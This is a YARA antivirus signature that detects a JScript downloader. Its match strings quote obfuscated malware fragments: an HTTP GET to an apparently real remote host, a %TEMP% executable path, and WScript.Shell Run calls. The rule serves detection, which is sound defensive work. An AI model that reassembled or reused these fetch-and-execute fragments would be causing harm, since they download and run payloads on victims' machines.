rule sig_20160329_1a03192a88f2b5b3f70b31ebef52f0a2 {
  meta:
    description = "datamaliciousorder - file 20160329_1a03192a88f2b5b3f70b31ebef52f0a2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d3ede155e5d03af12db3c894cf32285b61d2a8f223cc29e494a6537db0e11c94"

  strings:
    $s1  = "function Nimmnal() {return Ndzkz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5pPPD7UkiMLmv2.exe\";};" fullword ascii
    $s2  = "Ytyvoadz[Allfj](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Kwggcnb](Jqvpdpre() * 11)} while (Ytyvoadz[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Ndzkz = function Tqndrrc() {return WScript[Bfeedeob](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dmtkmm(Uzcsw, Odupgifib){return Uzcsw - Odupgifib;};" fullword ascii
    $s6  = "function Bmdayia() {return ((Uqwryou == true) && (Uqwryou == Kqpjz)) ? 1 : Atermcsqsw;};" fullword ascii
    $s7  = "function Swrevjj(Zlbdpylhmc){Ndzkz[\"Run\"](Zlbdpylhmc, Atermcsqsw, Atermcsqsw);};" fullword ascii
    $s8  = "function Rozgkpmb(){return Bfeedeob;};" fullword ascii
    $s9  = "function Myhfd(Jbqdaj) {var Inpkol = (1, 2, 3, 4, 5, Jbqdaj); return Inpkol;};" fullword ascii
    $s10 = "var Uqwryou = false;" fullword ascii
    $s11 = "function Gnbvwrqpdx()" fullword ascii
    $s12 = "function Iqvqoflwks(){return Hgqffldt;};" fullword ascii
    $s13 = "var Kqpjz = false;" fullword ascii
    $s14 = "function Jqvpdpre(){return 22;};" fullword ascii
    $s15 = "Uqwryou = true; " fullword ascii
    $s16 = "return Dmtkmm(Mvjzx, Wdhciynbpf);" fullword ascii
    $s17 = "var Dwlvbqi = false;" fullword ascii
    $s18 = " while (Cvgut){" fullword ascii
    $s19 = "Kqpjz = true; " fullword ascii
    $s20 = "} catch(Yheloyv){Cvgut = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}